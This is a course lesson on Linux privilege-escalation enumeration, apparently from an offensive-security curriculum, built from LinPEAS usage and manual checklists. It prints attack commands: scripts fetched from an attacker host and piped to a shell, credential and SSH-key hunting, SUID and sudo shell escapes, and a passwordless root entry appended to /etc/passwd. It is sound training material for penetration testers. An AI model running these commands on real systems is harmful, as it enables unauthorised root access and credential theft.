---
title: "Linux Privilege Escalation — Enumeration"
tags: [linux, privilege-escalation, enumeration, LinPEAS, manual-checklist,
       SUID, sudo, cron, capabilities, writable-files, T1548, T1053, ATT&CK]
module: 04-BroadSurface-04
day: 234
related_topics:
  - Linux Fundamentals (Days 9–16)
  - Linux PrivEsc Lab 1 — SUID and Sudo (Day 235)
  - Linux PrivEsc Lab 2 — Cron and Writable Files (Day 236)
  - Kernel Exploits (Day 237)
---

# Day 234 — Linux Privilege Escalation: Enumeration

> "Every time you land on a Linux box as a low-privilege user, the first
> fifteen minutes are identical. You run the same checks, in the same order,
> every time. Not because you are a script kiddie — because those checks exist
> for a reason. Something in that list almost always turns up something. The
> art is knowing which result to follow and which ones are rabbit holes.
> That takes repetition."
>
> — Ghost

---

## Goals

By the end of today's session you will be able to:

1. Enumerate a Linux host methodically using both automated and manual techniques.
2. Identify every major privilege escalation category and the check that
   surfaces it.
3. Interpret LinPEAS output and prioritise findings by severity.
4. Build a personal enumeration checklist you can execute from memory.
5. Understand why certain misconfigurations exist and therefore where to find them.

**Time budget:** 4 hours.

---

## Prerequisites

| Requirement | Covered in |
|---|---|
| Linux filesystem, processes, permissions | Days 9–16 |
| File permissions (rwxs, sticky bit) | Day 10 |
| Understanding of sudo, cron, capabilities | Days 11–12 |

---

## Part 1 — The PrivEsc Mindset

You are not looking for one thing. You are building a picture of the system's
attack surface. Every check adds context. The escalation path is often a
combination of two weaknesses — neither of which is exploitable alone.

### Priority Order for Enumeration

Run checks in this order: fast wins first, expensive checks last.

```
1. Who am I and what groups do I belong to?
2. What can sudo do for me?
3. What SUID/GUID binaries exist?
4. What capabilities are set?
5. What writable files/directories exist in sensitive locations?
6. What cron jobs run as root?
7. What services are running? What ports are listening locally?
8. What is the kernel version? Are there public exploits?
9. What world-writable or group-writable config files exist?
10. Are there credentials stored in the filesystem?
```

---

## Part 2 — Automated Enumeration: LinPEAS

LinPEAS (Linux Privilege Escalation Awesome Script) is the most comprehensive
automated enumeration tool for Linux. Run it first, then verify findings manually.

```bash
# Transfer to target (no internet access — use your own server)
# From your attacker machine:
python3 -m http.server 8000 &

# On the target:
curl -sL http://<attacker-ip>:8000/linpeas.sh | sh 2>/dev/null | tee /tmp/lpe.txt

# Or download and run:
wget -q http://<attacker-ip>:8000/linpeas.sh -O /tmp/l.sh
chmod +x /tmp/l.sh && /tmp/l.sh | tee /tmp/lpe.txt

# Alternative: transfer the binary version (no bash required)
wget -q http://<attacker-ip>:8000/linpeas_linux_amd64 -O /tmp/lpe
chmod +x /tmp/lpe && /tmp/lpe | tee /tmp/lpe.txt
```

### Reading LinPEAS Output

LinPEAS colour-codes results:
- **Red/Yellow** (95% confidence): almost certainly exploitable
- **Yellow** (high interest): review manually
- **Green** (potential): worth checking but may be a false positive

**Sections to focus on first:**
```
[+] Sudo version      → old version = known exploits
[+] SUDO!             → sudoers entries — any NOPASSWD?
[+] SUID              → non-standard SUID binaries
[+] Capabilities      → cap_setuid or cap_net_raw on any binary?
[+] Cron jobs         → any writable script run by root?
[+] Interesting files → .env files, config files with credentials
[+] Writable folders  → any writable path in root's PATH?
```

---

## Part 3 — Manual Enumeration Checklist

Never depend exclusively on automated tools. Know what each check does so you
can run it manually when LinPEAS is not available (restricted shell, no file
transfer, watched environment).

### Identity and Context

```bash
# Who am I?
id
whoami
groups

# What can sudo do for this user?
sudo -l

# What other users exist? Which have shells?
cat /etc/passwd | grep -v nologin | grep -v false | grep -v sync

# Which users have recently logged in?
last -20
lastlog | grep -v 'Never'

# Am I in any interesting groups?
# docker, lxd, disk, adm, staff, sudo, wheel → each has escalation paths
id | grep -oE '\(.*?\)' | tr -d '()'
```

### SUID and GUID Binaries

```bash
# Find all SUID binaries (run as file owner, typically root)
find / -perm -4000 -type f 2>/dev/null | sort
find / -perm -4000 -ls 2>/dev/null

# Find all GUID binaries (run as file group)
find / -perm -2000 -type f 2>/dev/null | sort

# Both SUID and GUID:
find / -perm -6000 -type f 2>/dev/null | sort

# Cross-reference found binaries against GTFOBins:
# https://gtfobins.github.io/ — filter by "suid"
```

### Sudo Configuration

```bash
# Full sudoers — requires read access (usually requires sudo -l)
sudo -l

# Common escalation patterns:
# (root) NOPASSWD: /usr/bin/vim     → vim shell escape
# (root) NOPASSWD: /usr/bin/find    → find -exec /bin/sh \;
# (root) NOPASSWD: /usr/bin/python* → python -c 'import os; os.system("/bin/sh")'
# (root) NOPASSWD: /bin/cp          → overwrite /etc/passwd or /etc/sudoers
# (root) NOPASSWD: /usr/bin/tee     → write to any file as root

# Check sudo version for CVEs:
sudo --version
# CVE-2021-3156 (Heap Overflow, sudo < 1.9.5p2)
# CVE-2019-14287 (sudo -u#-1 root bypass, sudo < 1.8.28)
```

### Linux Capabilities

```bash
# List all files with capabilities set
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid     → can set UID to 0 → escalate to root
# cap_net_bind_service → can bind privileged ports (not direct escalation)
# cap_net_raw    → can craft raw packets (useful for sniffing)
# cap_dac_override → can bypass file permission checks
# cap_sys_admin  → very broad — can mount filesystems, etc.

# Example escalation — Python with cap_setuid:
# getcap output: /usr/bin/python3.8 = cap_setuid+ep
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Cron Jobs

```bash
# System-wide cron (root's jobs)
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/ /etc/cron.hourly/

# User crontabs (need access)
crontab -l
crontab -u root -l 2>/dev/null  # requires sudo or root

# Is any cron job running a script you can write to?
# Is any cron job running a binary in a PATH directory you can write to?

# Live monitoring — watch for processes spawned by cron
watch -n1 'ps aux | grep -v grep | grep -E "cron|PID" '

# pspy — passively monitors process creation without root
wget http://<attacker>:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy
/tmp/pspy | tee /tmp/pspy-output.txt
# Wait 2–3 minutes — watch for UID=0 processes
```

### Writable Files and Directories

```bash
# World-writable files (anyone can write)
find / -writable -not -path "*/proc/*" -not -path "*/sys/*" 2>/dev/null | \
  grep -v '/tmp\|/var/tmp\|/dev\|/run'

# World-writable directories (can create files in them)
find / -writable -type d 2>/dev/null | \
  grep -v '/tmp\|/var/tmp\|/dev\|/proc\|/sys\|/run'

# Files owned by your user that are in sensitive locations
find / -user $(whoami) 2>/dev/null | \
  grep -v '/proc\|/sys\|/home\|/tmp'

# Check if any directory in root's PATH is writable by you
echo $PATH  # get root's PATH (may differ — check /root/.bashrc or /etc/environment)
for dir in $(echo $PATH | tr ':' '\n'); do
  [ -w "$dir" ] && echo "[WRITABLE] $dir"
done
```

### Network and Services

```bash
# What is listening locally? (ports not visible externally)
ss -tulnp
netstat -tulnp 2>/dev/null
cat /proc/net/tcp | awk '{print $2}' | cut -d: -f2 | \
  while read hex; do printf "%d\n" 0x${hex}; done | sort -n | uniq

# What processes are running?
ps auxf
ps -eF

# What services are enabled?
systemctl list-unit-files --state=enabled 2>/dev/null
service --status-all 2>/dev/null

# Interesting writable service files:
find /etc/systemd /lib/systemd -writable 2>/dev/null
```

### Credentials in the Filesystem

```bash
# History files
cat ~/.bash_history ~/.zsh_history ~/.sh_history 2>/dev/null
find / -name "*.history" -readable 2>/dev/null

# Config files with passwords
find / -readable -name "*.conf" -o -name "*.config" -o -name "*.ini" \
  -o -name "*.env" -o -name "*.xml" 2>/dev/null | \
  xargs grep -lE "password|passwd|secret|key|token|credential" 2>/dev/null

# SSH private keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \
  2>/dev/null -readable

# Database credentials
grep -r "DB_PASS\|database_password\|db_password\|MYSQL_ROOT_PASSWORD" \
  /var/www /opt /srv /etc 2>/dev/null

# AWS credentials
find / -name "credentials" -path "*/.aws/*" 2>/dev/null -readable
find / -name "*.env" -readable 2>/dev/null | xargs grep -l "AWS_SECRET"
```

### Kernel Version

```bash
uname -a
cat /proc/version
cat /etc/os-release

# Cross-reference with known exploits:
# searchsploit linux kernel <version>
# https://www.linuxkernelcves.com/

# Famous kernel exploits by version:
# < 5.8.0:  CVE-2021-4034 (PwnKit — Polkit)
# 2.6–4.x:  DirtyCow (CVE-2016-5195)
# 4.x–5.x:  overlayfs (multiple CVEs)
# Check with: searchsploit "linux kernel" | grep "Privilege Escalation"
```

---

## Part 4 — GTFOBins Reference

GTFOBins (https://gtfobins.github.io/) documents how common Unix binaries
can be abused for privilege escalation when run with elevated permissions.

### Quick Reference: Most Common SUID Abuses

```bash
# vim / vi
vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-p")'

# find
find . -exec /bin/bash -p \; -quit

# python / python3
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# bash (with SUID set — uncommon but exists on misconfigurations)
bash -p

# nmap (older versions with --interactive)
nmap --interactive
# !sh

# cp (copy /etc/passwd to writable location, modify, copy back)
cp /etc/passwd /tmp/passwd_bak
echo 'ghost::0:0:root:/root:/bin/bash' >> /tmp/passwd_bak
cp /tmp/passwd_bak /etc/passwd  # requires write permission on /etc/passwd

# tar (wildcard injection — see Day 236)
```

---

## Key Takeaways

1. **Enumerate before you exploit.** A premature exploit attempt alerts
   defenders and may break the service. Ten minutes of enumeration saves
   an hour of failed exploitation.
2. **SUID + sudo + cron + writable files cover 80% of real-world paths.**
   Focus on these four categories before looking at kernel exploits.
3. **LinPEAS is a starting point, not an answer.** False positives exist.
   Manual verification of every red/yellow finding is not optional.
4. **Groups are underrated.** Being in the `docker`, `lxd`, `disk`, or `adm`
   group is often an instant root — but it does not show up as a SUID binary.
   Always check your group memberships and look up what each group can do.
5. **pspy finds cron jobs that crontab cannot.** Scheduled jobs run by root
   do not always appear in `/etc/crontab`. pspy monitors `/proc` for new
   processes — it finds jobs from all sources.

---

## Exercises

1. Spin up a vanilla Ubuntu 22.04 container. Run LinPEAS against it. How
   many red/yellow findings does a clean installation produce? Document
   each finding and classify it as true finding, false positive, or
   informational.

2. Write the LinPEAS findings for a hypothetical box that has:
   - `/usr/bin/python3` with `cap_setuid+ep`
   - A cron job running `/opt/backup.sh` every minute as root
   - World-writable `/opt/backup.sh`

   Write the exact exploitation steps for each of the three paths.
   Which would you use first and why?

3. Build a personal "OSCP-style" enumeration cheat sheet — one page,
   all commands from memory, ordered by priority. This is a critical
   artifact you will use in every future engagement.

4. Research: what is the `lxd` privilege escalation path? What exact
   conditions are required (group membership, lxd installation)? Write
   the full exploit sequence from group membership to root shell.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q234.1, Q234.2 …).
> Follow-up questions use hierarchical numbering (Q234.1.1, Q234.1.2 …).

---

## Navigation

← Previous: [Day 233 — Network Credential Extraction](DAY-0233-Network-Credential-Extraction.md)
→ Next: [Day 235 — Linux PrivEsc Lab 1: SUID and Sudo](DAY-0235-Linux-PrivEsc-Lab-1-SUID-Sudo.md)
